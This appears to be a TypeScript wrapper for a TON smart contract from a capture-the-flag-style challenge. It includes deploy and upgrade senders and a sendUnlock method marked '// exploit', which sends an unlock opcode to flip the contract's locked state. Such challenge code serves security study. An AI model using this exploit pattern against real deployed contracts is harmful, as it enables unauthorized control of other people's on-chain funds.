import { Address, beginCell, Cell, Contract, contractAddress, ContractProvider, Sender, SendMode } from '@ton/core';

export type UpgradeConfig = {
    ctxPlayer: Address;
    ctxNonce: bigint;
    ctxLocked: bigint;
};

export function proxyConfigToCell(config: UpgradeConfig): Cell {
    return beginCell().storeAddress(config.ctxPlayer).storeUint(config.ctxNonce, 32).storeInt(-1, 1).endCell();
}

export const Opcodes = {
    OP_UPGRADE: 0xdbfaf817,
    OP_UNLOCK: 0x01,
};

export class Upgrade implements Contract {
    constructor(
        readonly address: Address,
        readonly init?: { code: Cell; data: Cell },
    ) {}

    static createFromAddress(address: Address) {
        return new Upgrade(address);
    }

    static createFromConfig(config: UpgradeConfig, code: Cell, workchain = 0) {
        const data = proxyConfigToCell(config);
        const init = { code, data };
        return new Upgrade(contractAddress(workchain, init), init);
    }

    async sendDeploy(provider: ContractProvider, via: Sender, value: bigint) {
        await provider.internal(via, {
            value,
            sendMode: SendMode.PAY_GAS_SEPARATELY,
            body: beginCell().endCell(),
        });
    }

    async sendUpgrade(provider: ContractProvider, via: Sender, value: bigint, body: Cell) {
        await provider.internal(via, {
            value,
            sendMode: SendMode.PAY_GAS_SEPARATELY,
            body: beginCell().storeUint(Opcodes.OP_UPGRADE, 32).storeRef(body).endCell(),
        });
    }

    // exploit
    async sendUnlock(provider: ContractProvider, via: Sender, value: bigint) {
        await provider.internal(via, {
            value,
            sendMode: SendMode.PAY_GAS_SEPARATELY,
            body: beginCell().storeUint(Opcodes.OP_UNLOCK, 32).endCell(),
        });
    }

    async getLocked(provider: ContractProvider) {
        const result = await provider.get('locked', []);
        return result.stack.readBoolean();
    }
}
